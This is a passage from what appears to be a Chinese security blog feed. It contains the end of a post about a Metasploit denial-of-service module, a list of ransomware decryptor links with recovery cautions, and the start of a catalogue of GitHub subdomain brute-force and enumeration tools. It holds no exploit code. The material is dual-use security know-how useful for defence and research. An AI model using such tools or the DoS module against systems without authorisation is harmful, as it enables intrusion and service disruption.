title="MSF实现DOS攻击"></a>MSF实现DOS攻击</h3><p>MSF中存在该漏洞利用模块，可以实现DOS攻击，由于是实际环境，出于安全因素考虑，没有实际执行攻击。可以搭建本地实验环境，我用Win7测试后会出现蓝屏现象，生产环境中不要贸然尝试，注意安全(｡･∀･)ﾉﾞ。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒解密工具汇总</title>
      <link href="/2019/11/11/EncryptTools/"/>
      <url>/2019/11/11/EncryptTools/</url>
      
        <content type="html"><![CDATA[<p>此处汇总了众多勒索病毒解密工具信息，有需要者可自取哦！（工具很多，建议收藏）</p><span id="more"></span><h2 id="1-勒索软件解密工具"><a href="#1-勒索软件解密工具" class="headerlink" title="1 勒索软件解密工具"></a>1 勒索软件解密工具</h2><p>✎[Apocalypse勒索软件解密工具]</p><p><a href="https://www.pcrisk.com/removal-guides/10111-apocalypse-ransomware">https://www.pcrisk.com/removal-guides/10111-apocalypse-ransomware</a></p><p>✎[Alcatrazlocker勒索软件解密工具]</p><p><a href="https://files.avast.com/files/decryptor/avast_decryptor_alcatrazlocker.exe">https://files.avast.com/files/decryptor/avast_decryptor_alcatrazlocker.exe</a></p><p>✎[Alma勒索软件解密工具]</p><p><a href="https://info.phishlabs.com/blog/alma-ransomware-analysis-of-a-new-ransomware-threat-and-a-decrypter">https://info.phishlabs.com/blog/alma-ransomware-analysis-of-a-new-ransomware-threat-and-a-decrypter</a></p><p>✎[Alpha勒索软件解密工具]</p><p><a href="https://dl.360safe.com/Decryptor_AlphaDecrypter.cab">https://dl.360safe.com/Decryptor_AlphaDecrypter.cab</a></p><p>✎[AL-Namrood勒索软件解密工具]</p><p><a href="https://www.pcrisk.com/removal-guides/10535-al-namrood-ransomware">https://www.pcrisk.com/removal-guides/10535-al-namrood-ransomware</a></p><p>✎[Apocalypse 勒索病毒解密工具]</p><p><a href="http://blog.emsisoft.com/2016/06/29/apocalypse-ransomware-which-targets-companies-through-insecure-rdp/">http://blog.emsisoft.com/2016/06/29/apocalypse-ransomware-which-targets-companies-through-insecure-rdp/</a></p><p>✎[Autolocky勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/decrypted-the-new-autolocky-ransomware-fails-to-impersonate-locky/">https://www.bleepingcomputer.com/news/security/decrypted-the-new-autolocky-ransomware-fails-to-impersonate-locky/</a></p><p>✎[Bart勒索病毒解密工具]</p><p><a href="http://phishme.com/rockloader-downloading-new-ransomware-bart/">http://phishme.com/rockloader-downloading-new-ransomware-bart/</a></p><p>✎[BitDtak勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/BitStakDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/BitStakDecrypter.zip</a></p><p>✎[BarRax勒索软件解密工具]</p><p><a href="https://blog.checkpoint.com/wp-content/uploads/2017/03/BarRaxDecryptor.zip">https://blog.checkpoint.com/wp-content/uploads/2017/03/BarRaxDecryptor.zip</a></p><p>✎[CryptON 勒索病毒解密工具]</p><p><a href="http://blog.emsisoft.com/2017/03/07/emsisoft-releases-free-decrypter-for-crypton-ransomware/">http://blog.emsisoft.com/2017/03/07/emsisoft-releases-free-decrypter-for-crypton-ransomware/</a></p><p>✎[CoinVault勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/virus-removal/coinvault-ransomware-information">https://www.bleepingcomputer.com/virus-removal/coinvault-ransomware-information</a></p><p>✎[CryptXXX勒索病毒解密工具]</p><p><a href="http://www.bleepingcomputer.com/virus-removal/cryptxxx-ransomware-help-information">http://www.bleepingcomputer.com/virus-removal/cryptxxx-ransomware-help-information</a></p><p>✎[Crypt0勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/Crypt0Decrypter.zip">https://download.bleepingcomputer.com/demonslay335/Crypt0Decrypter.zip</a></p><p><a href="https://www.pcrisk.com/removal-guides/10478-crypt0-ransomware">https://www.pcrisk.com/removal-guides/10478-crypt0-ransomware</a></p><p>✎[Crypt38Keygen勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/Crypt38Keygen.zip">https://download.bleepingcomputer.com/demonslay335/Crypt38Keygen.zip</a></p><p>✎[Crypren勒索软件解密工具]</p><p><a href="https://github.com/pekeinfo/DecryptCrypren">https://github.com/pekeinfo/DecryptCrypren</a></p><p><a href="http://www.nyxbone.com/malware/Crypren.html">http://www.nyxbone.com/malware/Crypren.html</a></p><p>✎[CryptComsole勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/CryptConsoleDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/CryptConsoleDecrypter.zip</a></p><p>✎[Crytomix勒索软件解密工具]</p><p><a href="https://files.avast.com/files/decryptor/avast_decryptor_cryptomix.exe">https://files.avast.com/files/decryptor/avast_decryptor_cryptomix.exe</a></p><p>✎[CryptoHostKeygen勒索软件解密工具]</p><p><a href="https://github.com/Demonslay335/CryptoHostKeygen">https://github.com/Demonslay335/CryptoHostKeygen</a></p><p>✎[Cry9勒索软件解密工具]</p><p><a href="https://www.pcrisk.com/removal-guides/11199-cry9-ransomware">https://www.pcrisk.com/removal-guides/11199-cry9-ransomware</a></p><p><a href="http://blog.emsisoft.com/2017/04/04/remove-cry9-ransomware-with-emsisofts-free-decrypter/">http://blog.emsisoft.com/2017/04/04/remove-cry9-ransomware-with-emsisofts-free-decrypter/</a></p><p>✎[CoinVault勒索软件解密工具]</p><p><a href="https://www.nomoreransom.org/uploads/CoinVaultDecryptor.zip">https://www.nomoreransom.org/uploads/CoinVaultDecryptor.zip</a></p><p>✎[Cryptinfinite勒索软件解密工具]</p><p><a href="https://www.pcrisk.com/removal-guides/9568-cryptinfinite-ransomware">https://www.pcrisk.com/removal-guides/9568-cryptinfinite-ransomware</a></p><p>✎[CrazyCrypt勒索密钥生成工具]</p><p><a href="https://edr.sangfor.com.cn/file/tool/CrazyCrypt_Password.rar">https://edr.sangfor.com.cn/file/tool/CrazyCrypt_Password.rar</a></p><p>✎[DXXD勒索病毒解密工具]</p><p><a href="http://www.bleepingcomputer.com/news/security/the-week-in-ransomware-october-14-2016-exotic-lockydump-comrade-and-more/">http://www.bleepingcomputer.com/news/security/the-week-in-ransomware-october-14-2016-exotic-lockydump-comrade-and-more/</a></p><p>✎[DoNotOpen勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/DoNotOpenDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/DoNotOpenDecrypter.zip</a></p><p>✎[Decrypt Protect[mbl advisory]勒索病毒解密工具]</p><p><a href="http://www.malwareremovalguides.info/decrypt-files-with-decrypt_mblblock-exe-decrypt-protect/">http://www.malwareremovalguides.info/decrypt-files-with-decrypt_mblblock-exe-decrypt-protect/</a></p><p>✎[Enigma勒索软件解密工具]</p><p><a href="https://www.im-infected.com/ransomware/remove-enigma-ransomware-virus-removal.html">https://www.im-infected.com/ransomware/remove-enigma-ransomware-virus-removal.html</a></p><p>✎[EduCrypt勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/the-educrypt-ransomware-tries-to-teach-you-a-lesson/">https://www.bleepingcomputer.com/news/security/the-educrypt-ransomware-tries-to-teach-you-a-lesson/</a></p><p>✎[GhostCrypt勒索病毒解密工具]</p><p><a href="http://www.bleepingcomputer.com/forums/t/614197/ghostcrypt-z81928819-help-support-topic-read-this-filetxt/">http://www.bleepingcomputer.com/forums/t/614197/ghostcrypt-z81928819-help-support-topic-read-this-filetxt/</a></p><p>✎[GhostCrypt勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/GhostCryptDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/GhostCryptDecrypter.zip</a></p><p>✎[Gomasom勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/gomasom-crypt-ransomware-decrypted/">https://www.bleepingcomputer.com/news/security/gomasom-crypt-ransomware-decrypted/</a></p><p>✎[GandCrab勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/fbi-releases-master-decryption-keys-for-gandcrab-ransomware/">https://www.bleepingcomputer.com/news/security/fbi-releases-master-decryption-keys-for-gandcrab-ransomware/</a></p><p>✎[Hidden tear勒索软件解密工具]</p><p><a href="https://files.avast.com/files/decryptor/avast_decryptor_hiddentear.exe">https://files.avast.com/files/decryptor/avast_decryptor_hiddentear.exe</a></p><p><a href="https://download.bleepingcomputer.com/demonslay335/hidden-tear-decrypter.zip">https://download.bleepingcomputer.com/demonslay335/hidden-tear-decrypter.zip</a></p><p>✎[HydraCrypt&#x2F;UmbreCrypt勒索病毒解密工具]</p><p><a href="http://blog.emsisoft.com/2016/02/12/decrypter-for-hydracrypt-and-umbrecrypt-available/">http://blog.emsisoft.com/2016/02/12/decrypter-for-hydracrypt-and-umbrecrypt-available/</a></p><p>✎[HydraCrypt勒索软件解密工具]</p><p><a href="https://tmp.emsisoft.com/fw/decrypt_hydracrypt.exe">https://tmp.emsisoft.com/fw/decrypt_hydracrypt.exe</a></p><p>✎[Hidden Tear勒索软件解密工具]</p><p><a href="https://www.cyber.nj.gov/threat-profiles/ransomware-variants/hidden-tear">https://www.cyber.nj.gov/threat-profiles/ransomware-variants/hidden-tear</a></p><p>✎[InsaneCrypt勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/InsaneCryptDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/InsaneCryptDecrypter.zip</a></p><p>✎[Ims00rry勒索软件解密工具]</p><p><a href="https://securityaffairs.co/wordpress/88376/malware/ims00rry-ransomware-decryptor.html">https://securityaffairs.co/wordpress/88376/malware/ims00rry-ransomware-decryptor.html</a></p><p><a href="https://www.emsisoft.com/decrypter/ims00rry">https://www.emsisoft.com/decrypter/ims00rry</a></p><p>✎[Jigsaw勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/jigsaw-ransomware-becomes-cryptohitman-with-porno-extension/">https://www.bleepingcomputer.com/news/security/jigsaw-ransomware-becomes-cryptohitman-with-porno-extension/</a></p><p>✎[JuicyLemon勒索软件解密工具]</p><p><a href="https://dl.360safe.com/Decryptor_JuicyLemonDecoder.cab">https://dl.360safe.com/Decryptor_JuicyLemonDecoder.cab</a></p><p>✎[JigSaw勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/JigSawDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/JigSawDecrypter.zip</a></p><p>✎[Lockcrypt勒索软件解密工具]</p><p><a href="https://labs.bitdefender.com/wp-content/uploads/downloads/lockcrypt-ransomware-decryptor/">https://labs.bitdefender.com/wp-content/uploads/downloads/lockcrypt-ransomware-decryptor/</a></p><p>✎[Legion勒索病毒解密工具]</p><p><a href="http://botcrawl.com/legion-ransomware/">http://botcrawl.com/legion-ransomware/</a></p><p>✎[LockedIn勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/LockedInDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/LockedInDecrypter.zip</a></p><p>✎[MirCop勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/MirCopDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/MirCopDecrypter.zip</a></p><p>✎[Mblblock勒索软件解密工具]</p><p><a href="https://tmp.emsisoft.com/fw/decrypt_mblblock.exe">https://tmp.emsisoft.com/fw/decrypt_mblblock.exe</a></p><p>✎[Marlboro勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/marlboro-ransomware-defeated-in-one-day/">https://www.bleepingcomputer.com/news/security/marlboro-ransomware-defeated-in-one-day/</a></p><p>✎[Nullbyte勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/news/security/the-nullbyte-ransomware-pretends-to-be-the-necrobot-pokemon-go-application/">https://www.bleepingcomputer.com/news/security/the-nullbyte-ransomware-pretends-to-be-the-necrobot-pokemon-go-application/</a></p><p>✎[NullByte勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/NullByteDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/NullByteDecrypter.zip</a></p><p>✎[Nanolocker勒索软件解密工具]</p><p><a href="https://github.com/Cyberclues/nanolocker-decryptor">https://github.com/Cyberclues/nanolocker-decryptor</a></p><p>✎[NMoreira勒索软件解密工具]</p><p><a href="https://www.pcrisk.com/removal-guides/10689-nmoreira-ransomware">https://www.pcrisk.com/removal-guides/10689-nmoreira-ransomware</a></p><p>✎[NanoLocker勒索病毒解密工具]</p><p><a href="http://blog.malwareclipboard.com/2016/01/nanolocker-ransomware-analysis.html">http://blog.malwareclipboard.com/2016/01/nanolocker-ransomware-analysis.html</a></p><p>✎[OpenToYou 勒索病毒解密工具]</p><p><a href="http://blog.emsisoft.com/2016/12/30/emsisoft-releases-free-decrypter-for-opentoyou-ransomware/">http://blog.emsisoft.com/2016/12/30/emsisoft-releases-free-decrypter-for-opentoyou-ransomware/</a></p><p>✎[Odcodc勒索病毒解密工具]</p><p><a href="http://www.nyxbone.com/malware/odcodc.html">http://www.nyxbone.com/malware/odcodc.html</a></p><p>✎[ODCODCDecoder勒索软件解密工具]</p><p><a href="https://dl.360safe.com/Decryptor_ODCODCDecoder.cab">https://dl.360safe.com/Decryptor_ODCODCDecoder.cab</a></p><p>✎[Pclock勒索软件解密工具]</p><p><a href="https://www.bleepingcomputer.com/forums/t/561970/new-pclock-cryptolocker-ransomware-discovered/">https://www.bleepingcomputer.com/forums/t/561970/new-pclock-cryptolocker-ransomware-discovered/</a></p><p>✎[PopCorn勒索软件解密工具]</p><p><a href="https://www.elevenpaths.com/downloads/RecoverPopCorn.zip">https://www.elevenpaths.com/downloads/RecoverPopCorn.zip</a></p><p>✎[Ransom.Cryakl勒索病毒解密工具]</p><p><a href="http://blog.checkpoint.com/2015/11/04/offline-ransomware-encrypts-your-data-without-cc-communication/">http://blog.checkpoint.com/2015/11/04/offline-ransomware-encrypts-your-data-without-cc-communication/</a></p><p>✎[Shade勒索软件解密工具]</p><p><a href="https://blog.kaspersky.com/shade-decryptor/12661/">https://blog.kaspersky.com/shade-decryptor/12661/</a></p><p>✎[SanSam勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/SamSamStringDecrypter.zip">https://download.bleepingcomputer.com/demonslay335/SamSamStringDecrypter.zip</a></p><p>✎[Unlock92勒索软件解密工具]</p><p><a href="https://download.bleepingcomputer.com/demonslay335/Unlock92Decrypter.zip">https://download.bleepingcomputer.com/demonslay335/Unlock92Decrypter.zip</a></p><p>✎[Unlocker勒索软件解密工具]</p><p><a href="https://github.com/kyrus/crypto-un-locker">https://github.com/kyrus/crypto-un-locker</a></p><p>✎[Wildfire勒索软件解密工具]</p><p><a href="https://downloadcenter.mcafee.com/products/mcafee-avert/wildfiredecrypt/wildfiredecrypt.exe">https://downloadcenter.mcafee.com/products/mcafee-avert/wildfiredecrypt/wildfiredecrypt.exe</a></p><h2 id="2-综合性解密工具网站"><a href="#2-综合性解密工具网站" class="headerlink" title="2 综合性解密工具网站"></a>2 综合性解密工具网站</h2><p>✎卡巴斯基：勒索软件解密工具集</p><p><a href="https://noransom.kaspersky.com/?spm=a2c4g.11186623.2.3.bSlRlm">https://noransom.kaspersky.com/?spm=a2c4g.11186623.2.3.bSlRlm</a></p><p>✎Avast：勒索软件解密工具集</p><p><a href="https://www.avast.com/zh-cn/ransomware-decryption-tools?spm=a2c4g.11186623.2.5.bSlRlm">https://www.avast.com/zh-cn/ransomware-decryption-tools?spm=a2c4g.11186623.2.5.bSlRlm</a></p><p>✎Trendmicro：勒索软件解密方案</p><p><a href="https://esupport.trendmicro.com/solution/zh-cn/1115118.aspx?spm=a2c4g.11186623.2.4.bSlRlm">https://esupport.trendmicro.com/solution/zh-cn/1115118.aspx?spm=a2c4g.11186623.2.4.bSlRlm</a></p><p>✎MalwareHunterTeam:勒索软件解密工具集</p><p><a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com/</a></p><p>✎nomoreransom：勒索软件解密工具集</p><p><a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>✎Emsisoft：勒索软件解密工具集</p><p><a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p><h2 id="3-勒索信息综合性查询网站"><a href="#3-勒索信息综合性查询网站" class="headerlink" title="3 勒索信息综合性查询网站"></a>3 勒索信息综合性查询网站</h2><p>✎深信服EDR官网勒索查询界面</p><p><a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p><p>✎botfrei.de网站</p><p><a href="https://www.botfrei.de/de/ransomware/galerie.html">https://www.botfrei.de/de/ransomware/galerie.html</a></p><h2 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4 注意事项"></a>4 注意事项</h2><p>此处提供的解密器（链接）均由互联网搜集而来，只对工具信息进行汇总，不保证解密工具的可行性和安全性，用户应做好数据备份，以防止不必要的损失。</p><p>使用解密工具您需要注意以下事项：</p><ul><li><p>1、通过勒索信息文件、加密后文件后缀等勒索特征判断勒索病毒家族。深信服EDR官网提供勒索病毒搜索功能，支持勒索病毒家族名或加密后缀查询，快速找到相关信息。<a href="https://edr.sangfor.com.cn/">搜索链接</a></p></li><li><p>2、选择对应家族（如有版本也应选择对应版本）的解密工具；</p></li><li><p>3、解密前需对重要的数据进行备份（即使处于被加密状态），以防止解密失败造成损失；</p></li><li><p>4、解密前需确保系统中的勒索病毒已被清除，否则可能遭到重复加密；</p></li><li><p>5、部分解密工具可能需要特定的解密环境（如在原始受感染的主机上进行解密、需要同时提供加密文件和原文件等），具体情况参考工具中的说明；</p></li><li><p>6、解密工具可能只对某些家族的特定变种或版本生效。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Encrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github上的部分hacker工具合集</title>
      <link href="/2019/11/11/GithubTools/"/>
      <url>/2019/11/11/GithubTools/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>Scanners Box</strong>也被称为 <strong>scanbox</strong>，是一个强大完备的黑客工具箱，它收集了Github上数10种类别的开源扫描器，包括子域名，数据库，中间件和其他模块化设计的扫描器等，<strong>但对于一些被大众所熟知的知名扫描工具，如nmap、w3af、brakeman、arachni、nikto、metasploit、aircrack-ng将不包括在本项目的收集范围内。</strong></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><!-- START doctoc generated TOC please keep comment here to allow auto update --><!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE --><ul><li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E6%9E%9A%E4%B8%BE%E6%88%96%E6%8E%A5%E7%AE%A1">子域名爆破枚举或接管</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%88%96%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4">数据库注入漏洞或认证爆破</a></li><li><a href="#%E7%BD%91%E7%AB%99%E5%BC%B1%E7%94%A8%E6%88%B7%E5%90%8D%E6%88%96%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%9E%9A%E4%B8%BE%E7%88%86%E7%A0%B4">网站弱用户名或弱口令枚举爆破</a></li><li><a href="#%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4%E6%88%96%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0">物联网设备认证爆破或漏洞评估</a></li><li><a href="#%E5%A4%9A%E7%B1%BB%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">多类型跨站脚本漏洞检测</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E6%88%96%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4">企业资产管理或数据保护</a></li><li><a href="#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%88%96%E6%9C%A8%E9%A9%AC%E6%A3%80%E6%B5%8B">恶意脚本或木马检测</a></li><li><a href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">内网渗透</a></li><li><a href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0%E6%88%96%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%89%AB%E6%8F%8F">中间件漏洞评估或信息泄露扫描</a></li><li><a href="#%E7%89%B9%E6%AE%8A%E7%BB%84%E4%BB%B6%E6%88%96%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%89%AB%E6%8F%8F">特殊组件或漏洞类型扫描</a></li><li><a href="#%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0">无线网络漏洞评估</a></li><li><a href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E6%B5%8B">局域网探测</a></li><li><a href="#%E5%8A%A8%E6%80%81%E6%88%96%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">动态或静态代码审计</a></li><li><a href="#%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1%E6%89%AB%E6%8F%8F%E5%99%A8%E6%88%96%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0%E6%A1%86%E6%9E%B6">模块化设计扫描器或漏洞评估框架</a></li><li><a href="#%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81">高级持续性威胁</a></li></ul><!-- END doctoc generated TOC please keep comment here to allow auto update --><hr><span id="more"></span><h3 id="子域名爆破枚举或接管"><a href="#子域名爆破枚举或接管" class="headerlink" title="子域名爆破枚举或接管"></a>子域名爆破枚举或接管</h3><ul><li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> - <strong>Lijiejie开发的一款使用广泛的子域名爆破枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a> - <strong>猪猪侠开发的一款域名收集全面、精准的子域名枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/le4f/dnsmaper">https://github.com/le4f/dnsmaper</a> - <strong>子域名枚举爆破工具以及地图位置标记</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/0xbug/orangescan">https://github.com/0xbug/orangescan</a> - <strong>提供web界面的在线子域名信息收集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a> - <strong>高效精准的子域名爆破工具,同时也是扫描器中最常用的子域名API库</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/We5ter/GSDF">https://github.com/We5ter/GSDF</a> - <strong>基于谷歌SSL透明证书的子域名查询脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/mandatoryprogrammer/cloudflare_enum">https://github.com/mandatoryprogrammer/cloudflare_enum</a>  - <strong>使用CloudFlare进行子域名枚举的脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> - <strong>Knock子域名获取，可用于查找子域名接管漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> - <strong>多方式收集目标子域名信息</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/code-scan/BroDomain">https://github.com/code-scan/BroDomain</a> - <strong>兄弟域名查询</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/chuhades/dnsbrute">https://github.com/chuhades/dnsbrute</a> - <strong>高效的子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a> - <strong>一款便捷高效的子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a> - <strong>子域名枚举、探测工具。可用于子域名接管漏洞探测</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/evilsocket/dnssearch">https://github.com/evilsocket/dnssearch</a> - <strong>一款子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/reconned/domained">https://github.com/reconned/domained</a> - <strong>可用于子域名收集的一款工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/bit4woo/Teemo">https://github.com/bit4woo/Teemo</a> - <strong>域名邮箱等信息收集及枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> - <strong>邮箱、服务器信息收集及子域名枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/nmalcolm/Inventus">https://github.com/nmalcolm/Inventus</a> - <strong>通过爬虫实现的子域名收集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a> - <strong>强大的快速子域枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/jonluca/Anubis">https://github.com/jonluca/Anubis</a> - <strong>子域名枚举及信息搜集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/n4xh4ck5/N4xD0rk">https://github.com/n4xh4ck5/N4xD0rk</a> - <strong>子域名查询工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a> - <strong>通过字符串组合排列的高效子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a> - <strong>基于AsyncIO协程以及非重复字典的子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a 